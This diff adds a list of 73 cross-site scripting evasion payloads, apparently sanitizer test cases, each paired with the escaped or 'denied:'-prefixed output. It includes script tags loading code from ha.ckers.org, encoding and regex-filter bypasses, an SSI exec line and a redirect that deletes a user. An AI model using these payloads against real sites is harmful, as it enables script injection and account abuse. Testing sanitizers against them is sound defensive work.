@@ -1,0 +1,642 @@
+1. XSS Locator
+
+Input code »
+';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
+
+Output code »
+';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--&gt;&lt;/SCRIPT&gt;"&gt;'&gt;&lt;SCRIPT&gt;alert(String.fromCharCode(88,83,83))&lt;/SCRIPT&gt;
+
+2. XSS Quick Test
+
+Input code »
+'';!--"<XSS>=&{()}
+
+Output code »
+'';!--"&lt;XSS&gt;=&amp;{()}
+
+3. SCRIPT w/Alert()
+
+Input code »
+<SCRIPT>alert('XSS')</SCRIPT>
+
+Output code »
+&lt;SCRIPT&gt;alert('XSS')&lt;/SCRIPT&gt;
+
+4. SCRIPT w/Source File
+
+Input code »
+<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>
+
+Output code »
+&lt;SCRIPT SRC=http://ha.ckers.org/xss.js&gt;&lt;/SCRIPT&gt;
+
+5. SCRIPT w/Char Code
+
+Input code »
+<SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
+
+Output code »
+&lt;SCRIPT&gt;alert(String.fromCharCode(88,83,83))&lt;/SCRIPT&gt;
+
+6. DIV background-image 1
+
+Input code »
+<DIV STYLE="background-image: url(javascript:alert('XSS'))">
+
+Output code »
+<div style="background-image: url(denied:javascript:alert('XSS'))"></div>
+
+7. DIV background-image 2
+
+Input code »
+<DIV STYLE="background-image: url(&#1;javascript:alert('XSS'))">
+
+Output code »
+<div style="background-image: url(denied:&amp;#1;javascript:alert('XSS'))"></div>
+
+8. DIV expression
+
+Input code »
+<DIV STYLE="width: expression(alert('XSS'));">
+
+Output code »
+<div style="width:  (alert('XSS'));"></div>
+
+9. IFRAME
+
+Input code »
+<IFRAME SRC="javascript:alert('XSS');"></IFRAME>
+
+Output code »
+&lt;IFRAME SRC="javascript:alert('XSS');"&gt;&lt;/IFRAME&gt;
+
+10. INPUT Image
+
+Input code »
+<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">
+
+Output code »
+<input type="image" src="denied:javascript:alert('XSS');" />
+
+11. IMG w/JavaScript Directive
+
+Input code »
+<IMG SRC="javascript:alert('XSS');">
+
+Output code »
+<img src="denied:javascript:alert('XSS');" alt="image" />
+
+12. IMG No Quotes/Semicolon
+
+Input code »
+<IMG SRC=javascript:alert('XSS')>
+
+Output code »
+<img src="denied:javascript:alert(" alt="image" />
+
+13. IMG Dynsrc
+
+Input code »
+<IMG DYNSRC="javascript:alert('XSS');">
+
+Output code »
+<img src="src" alt="image" />
+
+14. IMG Lowsrc
+
+Input code »
+<IMG LOWSRC="javascript:alert('XSS');">
+
+Output code »
+<img src="src" alt="image" />
+
+15. IMG Embedded commands 1
+
+Input code »
+<IMG SRC="http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode">
+
+Output code »
+<img src="http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode" alt="image" />
+
+16. IMG Embedded commands 2
+
+Input code »
+Redirect 302 /a.jpg http://victimsite.com/admin.asp&deleteuser
+
+Output code »
+Redirect 302 /a.jpg http://victimsite.com/admin.asp&amp;deleteuser
+
+17. IMG STYLE w/expression
+
+Input code »
+exp/*<XSS STYLE='no\xss:noxss("*//*");
+xss:&#101;x&#x2F;*XSS*//*/*/pression(alert("XSS"))'>
+
+Output code »
+exp/*&lt;XSS STYLE='no\xss:noxss("*//*");
+xss:&#101;x&#x2f;*XSS*//*/*/pression(alert("XSS"))'&gt;
+
+18. IMG w/VBscript
+
+Input code »
+<IMG SRC='vbscript:msgbox("XSS")'>
+
+Output code »
+<img src="denied:vbscript:msgbox(&quot;XSS&quot;)" alt="image" />
+
+19. LAYER
+
+Input code »
+<LAYER SRC="http://ha.ckers.org/scriptlet.html"></LAYER>
+
+Output code »
+&lt;LAYER SRC="http://ha.ckers.org/scriptlet.html"&gt;&lt;/LAYER&gt;
+
+20. Livescript
+
+Input code »
+<IMG SRC="livescript:[code]">
+
+Output code »
+<img src="denied:livescript:[code]" alt="image" />
+
+21. US-ASCII encoding
+
+Input code »
+%BCscript%BEalert(%A2XSS%A2)%BC/script%BE
+
+Output code »
+%BCscript%BEalert(%A2XSS%A2)%BC/script%BE
+
+22. Mocha
+
+Input code »
+<IMG SRC="mocha:[code]">
+
+Output code »
+<img src="denied:mocha:[code]" alt="image" />
+
+23. OBJECT
+
+Input code »
+<OBJECT TYPE="text/x-scriptlet" DATA="http://ha.ckers.org/scriptlet.html"></OBJECT>
+
+Output code »
+&lt;OBJECT TYPE="text/x-scriptlet" DATA="http://ha.ckers.org/scriptlet.html"&gt;&lt;/OBJECT&gt;
+
+24. OBJECT w/Embedded XSS
+
+Input code »
+<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:alert('XSS')></OBJECT>
+
+Output code »
+&lt;OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389&gt;&lt;param name="url" value="javascript:alert(" /&gt;&lt;/OBJECT&gt;
+
+25. Embed Flash
+
+Input code »
+<EMBED SRC="http://ha.ckers.org/xss.swf" AllowScriptAccess="always"></EMBED>
+
+Output code »
+&lt;EMBED SRC="http://ha.ckers.org/xss.swf" AllowScriptAccess="always"&gt;&lt;/EMBED&gt;
+
+26. OBJECT w/Flash 2
+
+Input code »
+a="get";&#10;b="URL("";&#10;c="javascript:";&#10;d="alert('XSS');")";
+eval(a+b+c+d);
+
+Output code »
+a="get";&#10;b="URL("";&#10;c="javascript:";&#10;d="alert('XSS');")";
+eval(a+b+c+d);
+
+27. STYLE
+
+Input code »
+<STYLE TYPE="text/javascript">alert('XSS');</STYLE>
+
+Output code »
+&lt;STYLE TYPE="text/javascript"&gt;alert('XSS');&lt;/STYLE&gt;
+
+28. STYLE w/Comment
+
+Input code »
+<IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))">
+
+Output code »
+<img style="xss:expr XSS*/ession(alert('XSS'))" src="src" alt="image" />
+
+29. STYLE w/Anonymous HTML
+
+Input code »
+<XSS STYLE="xss:expression(alert('XSS'))">
+
+Output code »
+&lt;XSS STYLE="xss:expression(alert('XSS'))"&gt;
+
+30. TABLE
+
+Input code »
+<TABLE BACKGROUND="javascript:alert('XSS')"></TABLE>
+
+Output code »
+<table></table>
+
+31. TD
+
+Input code »
+<TABLE><TD BACKGROUND="javascript:alert('XSS')"></TD></TABLE>
+
+Output code »
+<table>&lt;td&gt;&lt;/td&gt;</table>
+
+32. XML namespace
+
+Input code »
+<HTML xmlns:xss>
+<?import namespace="xss" implementation="http://ha.ckers.org/xss.htc">
+<xss:xss>XSS</xss:xss>
+</HTML>
+
+Output code »
+&lt;HTML xmlns:xss&gt;
+&lt;?import namespace="xss" implementation="http://ha.ckers.org/xss.htc"&gt;
+&lt;xss:xss&gt;XSS&lt;/xss:xss&gt;
+&lt;/HTML&gt;
+
+33. XML data island w/CDATA
+
+Input code »
+<XML ID=I><X><C><![CDATA[<IMG SRC="javas]]><![CDATA[cript:alert('XSS');">]]>
+</C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML>
+
+Output code »
+&lt;XML ID=I&gt;&lt;X&gt;&lt;C&gt;&lt;![CDATA[&lt;IMG SRC="javas]]&gt;&lt;![CDATA[cript:alert('XSS');"&gt;]]&gt;
+&lt;/C&gt;&lt;/X&gt;&lt;/xml&gt;<span></span>
+
+34. XML data island w/comment
+
+Input code »
+<XML ID="xss"><I><B><IMG SRC="javas<!-- -->cript:alert('XSS')"></B></I></XML>
+<SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN>
+
+Output code »
+&lt;XML ID="xss"&gt;<i><b><img src="src" alt="image" />cript:alert('XSS')"&gt;</b></i>&lt;/XML&gt;
+<span></span>
+
+35. XML (locally hosted)
+
+Input code »
+<XML SRC="http://ha.ckers.org/xsstest.xml" ID=I></XML>
+<SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>
+
+Output code »
+&lt;XML SRC="http://ha.ckers.org/xsstest.xml" ID=I&gt;&lt;/XML&gt;
+<span></span>
+
+36. XML HTML+TIME
+
+Input code »
+<HTML><BODY>
+<?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time">
+<?import namespace="t" implementation="#default#time2">
+<t:set attributeName="innerHTML" to="XSS<SCRIPT DEFER>alert('XSS')</SCRIPT>"> </BODY></HTML>
+
+Output code »
+&lt;HTML&gt;&lt;BODY&gt;
+&lt;?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"&gt;
+&lt;?import namespace="t" implementation="#default#time2"&gt;
+&lt;t:set attributeName="innerHTML" to="XSS&lt;SCRIPT DEFER&gt;alert('XSS')&lt;/SCRIPT&gt;"&gt; &lt;/BODY&gt;&lt;/HTML&gt;
+
+37. Commented-out Block
+
+Input code »
+<!--[if gte IE 4]>
+<SCRIPT>alert('XSS');</SCRIPT>
+<![endif]-->
+
+Output code »
+&lt;!--[if gte IE 4]&gt;
+&lt;SCRIPT&gt;alert('XSS');&lt;/SCRIPT&gt;
+&lt;![endif]--&gt;
+
+38. Rename .js to .jpg
+
+Input code »
+<SCRIPT SRC="http://ha.ckers.org/xss.jpg"></SCRIPT>
+
+Output code »
+&lt;SCRIPT SRC="http://ha.ckers.org/xss.jpg"&gt;&lt;/SCRIPT&gt;
+
+39. SSI
+
+Input code »
+<!--#exec cmd="/bin/echo '<SCRIPT SRC'"--><!--#exec cmd="/bin/echo '=http://ha.ckers.org/xss.js></SCRIPT>'"-->
+
+Output code »
+&lt;!--#exec cmd="/bin/echo '&lt;SCRIPT SRC'"--&gt;&lt;!--#exec cmd="/bin/echo '=http://ha.ckers.org/xss.js&gt;&lt;/SCRIPT&gt;'"--&gt;
+
+40. PHP
+
+Input code »
+<? echo('<SCR)';
+echo('IPT>alert("XSS")</SCRIPT>'); ?>
+
+Output code »
+&lt;? echo('&lt;SCR)';
+echo('IPT&gt;alert("XSS")&lt;/SCRIPT&gt;'); ?&gt;
+
+41. JavaScript Includes
+
+Input code »
+<BR SIZE="&{alert('XSS')}">
+
+Output code »
+<br />
+
+42. Case Insensitive
+
+Input code »
+<IMG SRC=JaVaScRiPt:alert('XSS')>
+
+Output code »
+<img src="denied:JaVaScRiPt:alert(" alt="image" />
+
+43. HTML Entities
+
+Input code »
+<IMG SRC=javascript:alert(&quot;XSS&quot;)>
+
+Output code »
+<img src="denied:javascript:alert(&quot;XSS&quot;)" alt="image" />
+
+44. Grave Accents
+
+Input code »
+<IMG SRC=`javascript:alert("RSnake says, 'XSS'")`>
+
+Output code »
+<img src="denied:`javascript:alert(" alt="image" />
+
+45. Image w/CharCode
+
+Input code »
+<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
+
+Output code »
+<img src="denied:javascript:alert(String.fromCharCode(88,83,83))" alt="image" />
+
+46. UTF-8 Unicode Encoding
+
+Input code »
+<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
+
+Output code »
+<img src="denied:&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;" alt="image" />
+
+47. Long UTF-8 Unicode w/out Semicolons
+
+Input code »
+<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>
+
+Output code »
+<img src="&amp;#0000106&amp;#0000097&amp;#0000118&amp;#0000097&amp;#0000115&amp;#0000099&amp;#0000114&amp;#0000105&amp;#0000112&amp;#0000116&amp;#0000058&amp;#0000097&amp;#0000108&amp;#0000101&amp;#0000114&amp;#0000116&amp;#0000040&amp;#0000039&amp;#0000088&amp;#0000083&amp;#0000083&amp;#0000039&amp;#0000041" alt="image" />
+
+48. DIV w/Unicode
+
+Input code »
+<DIV STYLE="background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029">
+
+Output code »
+<div style="background-image: 075 072 06C 028' 06a 061 076 061 073 063 072 069 070 074 03a 061 06c 065 072 074 028.1027 058.1053 053 027 029' 029"></div>
+
+49. Hex Encoding w/out Semicolons
+
+Input code »
+<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
+
+Output code »
+<img src="&amp;#x6A&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74&amp;#x3A&amp;#x61&amp;#x6C&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;#x27&amp;#x58&amp;#x53&amp;#x53&amp;#x27&amp;#x29" alt="image" />
+
+50. Embedded Tab
+
+Input code »
+<IMG SRC="jav    ascript:alert('XSS');">
+
+Output code »
+<img src="denied:jav    ascript:alert('XSS');" alt="image" />
+
+51. Embedded Encoded Tab
+
+Input code »
+<IMG SRC="jav&#x09;ascript:alert('XSS');">
+
+Output code »
+<img src="denied:jav&#x9;ascript:alert('XSS');" alt="image" />
+
+52. Embedded Newline
+
+Input code »
+<IMG SRC="jav&#x0A;ascript:alert('XSS');">
+
+Output code »
+<img src="denied:jav&#xa;ascript:alert('XSS');" alt="image" />
+
+53. Embedded Carriage Return
+
+Input code »
+<IMG SRC="jav&#x0D;ascript:alert('XSS');">
+
+Output code »
+<img src="denied:jav&#xd;ascript:alert('XSS');" alt="image" />
+
+54. Multiline w/Carriage Returns
+
+Input code »
+<IMG
+SRC
+=
+"
+j
+a
+v
+a
+s
+c
+r
+i
+p
+t
+:
+a
+l
+e
+r
+t
+(
+'
+X
+S
+S
+'
+)
+"
+>
+
+Output code »
+<img src="denied:j  a  v  a  s  c  r  i  p  t  :  a  l  e  r  t  (  '  X  S  S  '  )" alt="image" />
+
+55. Spaces/Meta Chars
+
+Input code »
+<IMG SRC=" &#14;  javascript:alert('XSS');">
+
+Output code »
+<img src="denied:&amp;#14;  javascript:alert('XSS');" alt="image" />
+
+56. Non-Alpha/Non-Digit
+
+Input code »
+<SCRIPT/XSS SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+
+Output code »
+&lt;SCRIPT/XSS SRC="http://ha.ckers.org/xss.js"&gt;&lt;/SCRIPT&gt;
+
+57. Non-Alpha/Non-Digit Part 2
+
+Input code »
+<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>
+
+Output code »
+&lt;BODY onload!#$%&amp;()*~+-_.,:;?@[/|\]^`=alert("XSS")&gt;
+
+58. No Closing Script Tag
+
+Input code »
+<SCRIPT SRC=http://ha.ckers.org/xss.js
+
+Output code »
+&lt;SCRIPT SRC=http://ha.ckers.org/xss.js
+
+59. Protocol resolution in script tags
+
+Input code »
+<SCRIPT SRC=//ha.ckers.org/.j>
+
+Output code »
+&lt;SCRIPT SRC=//ha.ckers.org/.j&gt;
+
+60. Half-Open HTML/JavaScript
+
+Input code »
+<IMG SRC="javascript:alert('XSS')"
+
+Output code »
+&lt;IMG SRC="javascript:alert('XSS')"
+
+61. Double open angle brackets
+
+Input code »
+<IFRAME SRC=http://ha.ckers.org/scriptlet.html <
+
+Output code »
+&lt;IFRAME SRC=http://ha.ckers.org/scriptlet.html &lt;
+
+62. Extraneous Open Brackets
+
+Input code »
+<<SCRIPT>alert("XSS");//<</SCRIPT>
+
+Output code »
+&lt;&lt;SCRIPT&gt;alert("XSS");//&lt;&lt;/SCRIPT&gt;
+
+63. Malformed IMG Tags
+
+Input code »
+<IMG """><SCRIPT>alert("XSS")</SCRIPT>">
+
+Output code »
+<img src="src" alt="image" />&lt;SCRIPT&gt;alert("XSS")&lt;/SCRIPT&gt;"&gt;
+
+64. No Quotes/Semicolons
+
+Input code »
+<SCRIPT>a=/XSS/
+alert(a.source)</SCRIPT>
+
+Output code »
+&lt;SCRIPT&gt;a=/XSS/
+alert(a.source)&lt;/SCRIPT&gt;
+
+65. Evade Regex Filter 1
+
+Input code »
+<SCRIPT a=">" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+
+Output code »
+&lt;SCRIPT a="&gt;" SRC="http://ha.ckers.org/xss.js"&gt;&lt;/SCRIPT&gt;
+
+66. Evade Regex Filter 2
+
+Input code »
+<SCRIPT ="blah" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+
+Output code »
+&lt;SCRIPT ="blah" SRC="http://ha.ckers.org/xss.js"&gt;&lt;/SCRIPT&gt;
+
+67. Evade Regex Filter 3
+
+Input code »
+<SCRIPT a="blah" '' SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+
+Output code »
+&lt;SCRIPT a="blah" '' SRC="http://ha.ckers.org/xss.js"&gt;&lt;/SCRIPT&gt;
+
+68. Evade Regex Filter 4
+
+Input code »
+<SCRIPT "a='>'" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+
+Output code »
+&lt;SCRIPT "a='&gt;'" SRC="http://ha.ckers.org/xss.js"&gt;&lt;/SCRIPT&gt;
+
+69. Evade Regex Filter 5
+
+Input code »
+<SCRIPT a=`>` SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+
+Output code »
+&lt;SCRIPT a=`&gt;` SRC="http://ha.ckers.org/xss.js"&gt;&lt;/SCRIPT&gt;
+
+70. Filter Evasion 1
+
+Input code »
+<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+
+Output code »
+&lt;SCRIPT&gt;document.write("&lt;SCRI");&lt;/SCRIPT&gt;PT SRC="http://ha.ckers.org/xss.js"&gt;&lt;/SCRIPT&gt;
+
+71. Filter Evasion 2
+
+Input code »
+<SCRIPT a=">'>" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+
+Output code »
+&lt;SCRIPT a="&gt;'&gt;" SRC="http://ha.ckers.org/xss.js"&gt;&lt;/SCRIPT&gt;
+
+72. Mixed Encoding
+
+Input code »
+<A HREF="h
+tt    p://6&#09;6.000146.0x7.147/">XSS</A>
+
+Output code »
+<a href="denied:h  tt    p://6&#9;6.000146.0x7.147/">XSS</a>
+
+73. JavaScript Link Location
+
+Input code »
+<A HREF="javascript:document.location='http://www.google.com/'">XSS</A>
+
+Output code »
+<a href="denied:javascript:document.location='http://www.google.com/'">XSS</a>
